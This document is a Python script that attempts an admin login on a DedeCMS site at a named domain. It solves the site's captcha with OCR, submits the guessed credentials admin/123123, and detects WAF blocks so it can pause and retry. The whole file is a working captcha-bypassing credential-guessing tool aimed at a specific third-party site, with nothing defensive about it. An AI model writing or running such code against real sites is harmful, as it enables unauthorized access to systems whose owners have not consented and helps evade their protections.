#!/usr/bin/env python3
"""bf_dede_single.py - 单次慢速测试 admin/123123"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://chinaglass.club'
ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
opener.open(urllib.request.Request(BASE + '/admin/login.php', headers=UA), timeout=10).read()
time.sleep(2)

for i in range(10):
    r = opener.open(urllib.request.Request(BASE + '/include/vdimgck.php', headers=UA), timeout=10)
    img = r.read()
    im = Image.open(io.BytesIO(img)).convert('L')
    im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
    im = im.point(lambda p: 255 if p > 130 else 0)
    buf = io.BytesIO()
    im.save(buf, 'PNG')
    c1 = ocr.classification(img)
    c2 = ocrb.classification(buf.getvalue())
    code = c1 if c1 == c2 else c2
    data = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                   'userid': 'admin', 'pwd': '123123', 'validate': code}).encode()
    req = urllib.request.Request(BASE + '/admin/login.php', data=data,
                                 headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                          'Referer': BASE + '/admin/login.php'})
    r2 = opener.open(req, timeout=10)
    b = r2.read(4000).decode('gbk', 'ignore')
    fu = r2.geturl()
    if 'stopinfo' in fu or 'vhostgo' in fu:
        print('try %d: WAF BLOCKED (code=%s)' % (i, code))
        time.sleep(5)
        continue
    if '楠岃瘉鐮佷笉姝' in b:
        print('try %d: captcha wrong (%s)' % (i, code))
        continue
    cns = re.findall(r'[\u4e00-\u9fff]{4,}', b)
    print('try %d: code=%s fu=%s CN=%s' % (i, code, fu, cns[:6]))
    if '浣犵殑瀵嗙爜閿欒' in b:
        print('  -> 密码错误(123123不是密码)')
    break
